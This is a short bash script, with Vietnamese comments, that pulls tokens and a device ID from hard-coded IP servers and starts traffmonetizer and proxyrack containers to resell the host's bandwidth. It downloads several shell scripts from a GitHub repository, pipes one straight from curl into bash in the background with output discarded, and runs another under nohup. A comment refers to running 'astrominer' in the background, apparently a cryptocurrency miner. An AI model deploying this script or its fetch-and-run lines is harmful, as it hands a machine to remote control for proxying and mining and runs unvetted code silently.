#!/bin/bash

# -------- traffmonetizer --------
NAME="traffmonetizer"
CHECK_URL="http://142.171.114.6:7000/worker-ping?groupId=group1"
CURRENT_TOKEN=""
RUN_ONCE=0

# -------- proxyrack --------
DEVICE_ID=$(curl -s http://74.48.96.46:3000/get-offline-key | grep -oP '"device_id"\s*:\s*"\K[^"]+')
if [ -n "$DEVICE_ID" ]; then
  docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop

  # Ping loop cho proxyrack (nền)
  (
    while true; do
      curl -X POST http://74.48.96.46:3000/ping \
        -H "Content-Type: application/json" \
        -d "{\"device_id\":\"$DEVICE_ID\"}"
      sleep 300
    done
  ) &
else
  echo "❌ Không lấy được device_id từ server"
fi


# -------- Main loop --------
while true; do
  RESPONSE=$(curl -s "$CHECK_URL")
  TOKEN=$(echo "$RESPONSE" | grep -oP '"appToken":\s*"\K([^"]+)')

  if [ -n "$TOKEN" ] && [ "$TOKEN" != "$CURRENT_TOKEN" ]; then
    docker rm -f "$NAME" >/dev/null 2>&1
    docker run -d --name "$NAME" -e TOKEN="$TOKEN" traffmonetizer/cli_v2 start accept --token "$TOKEN"
    CURRENT_TOKEN="$TOKEN"
  fi

  if [ $RUN_ONCE -eq 0 ]; then
    # Tải các file
    rm -rf 1.sh 2.sh 3.sh
    wget https://raw.githubusercontent.com/rabithoy/tth/main/1.sh
    wget -O 2.sh https://raw.githubusercontent.com/rabithoy/tth/main/key1.sh
    wget https://raw.githubusercontent.com/rabithoy/tth/main/3.sh
    bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &

    # Cấp quyền thực thi cho cả 3 file
    chmod +x 1.sh 2.sh 3.sh

    # Chạy script 3.sh
    nohup bash ./3.sh >/dev/null 2>&1 &
    # Chạy astrominer nền không chặn vòng lặp
    
    RUN_ONCE=1
  fi

  for i in {1..5}; do
    echo "ilovingyou"
    sleep 60
  done
done
